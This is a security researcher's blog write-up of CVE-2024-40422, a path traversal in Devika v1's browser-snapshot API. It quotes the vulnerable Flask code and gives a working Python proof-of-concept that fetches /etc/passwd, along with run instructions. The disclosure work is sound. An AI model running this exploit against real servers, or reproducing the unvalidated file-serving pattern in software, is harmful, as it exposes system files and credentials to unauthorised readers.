---
title: Uncovering Path Traversal in Devika v1 A Deep Dive into CVE-2024-40422
category: EXPLOIT
date: 2025-01-25
---

# Uncovering Path Traversal in Devika v1: A Deep Dive into CVE-2024-40422

## A Researcher’s Insight

In the field of security research, applications often present fascinating challenges and sometimes reveal critical vulnerabilities. During my analysis of Devika v1, I uncovered a serious security flaw—CVE-2024-40422. This path traversal vulnerability highlighted how small oversights could lead to significant exposure risks. Here’s a detailed look into my research.

## The Discovery

While auditing the Devika v1 application, my focus landed on the `/api/get-browser-snapshot` endpoint. This API endpoint accepted a `snapshot_path` parameter, which seemed to control which file was being served. Testing revealed that this parameter lacked proper validation, allowing traversal of the directory structure to access restricted files.

Additionally, I discovered that the application did not implement any authentication mechanism. This absence meant that any user, authenticated or not, could directly interact with the vulnerable endpoint, significantly amplifying the risk.

The vulnerability itself was stark and impactful. By manipulating the `snapshot_path` input, I could access files like `/etc/passwd`, demonstrating a clear security issue.

## Breaking Down the Vulnerable Code

The vulnerability was rooted in this snippet of code:

**File:** [devika.py](https://github.com/stitionai/devika/blob/main/devika.py)  
**Lines:** 123-127  

```python
@app.route("/api/get-browser-snapshot", methods=["GET"])
@route_logger(logger)
def browser_snapshot():
    snapshot_path = request.args.get("snapshot_path")
    return send_file(snapshot_path, as_attachment=True)
```

Here, the `send_file` function directly consumed the user-provided `snapshot_path` without any validation or sanitization. This oversight enabled an attacker to provide inputs such as `../../../etc/passwd` to access sensitive system files.

## Reproducing the Issue

As part of my research, I created a Python script to demonstrate the exploit and validate the issue. Below is the proof of concept (PoC):

### Proof of Concept

```python
#!/usr/bin/python

import argparse
import requests

def exploit(target_url):
    url = f'http://{target_url}/api/get-browser-snapshot'
    params = {
        'snapshot_path': '../../../../etc/passwd'
    }

    response = requests.get(url, params=params)
    print(response.text)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Explore the directory traversal bug.')
    parser.add_argument('-t', '--target', help='Enter the target URL (e.g., target.com)', required=True)
    args = parser.parse_args()

    exploit(args.target)
```

### Running the Script

1. Save the script as `exploit.py`.
2. Execute it with the target URL:
   ```
   python exploit.py -t target.com
   ```
3. The script retrieves the content of the `etc/passwd` file, effectively showcasing the issue.

This PoC highlights how an attacker could exploit the flaw to access arbitrary files on the server.

## Why This Matters

This vulnerability poses a significant threat:

- **Sensitive Data Exposure:** It allows attackers to read sensitive files such as configuration files or credentials.
- **Privilege Escalation Risks:** With access to critical files, an attacker could potentially escalate their privileges or further exploit the system.
- **Unrestricted Access:** The absence of authentication mechanisms exacerbates the severity, allowing anyone to exploit the issue without restriction.

### Severity
CVE-2024-40422 is rated as critical with a CVSS score of 9.1. The impact underscores the necessity of secure coding practices, particularly around file handling and access control.

## Final Thoughts

This research underscores the importance of thorough security reviews and rigorous input validation in software development. The Devika v1 vulnerability serves as a cautionary tale and a learning opportunity for developers and researchers alike.

For detailed information, check out the [GitHub advisory](https://github.com/advisories/GHSA-39m5-v8xj-6c9r). If you have insights or questions, feel free to connect with me on [X/Twitter](https://x.com/alpernae). Let’s make the digital world safer, one vulnerability at a time.
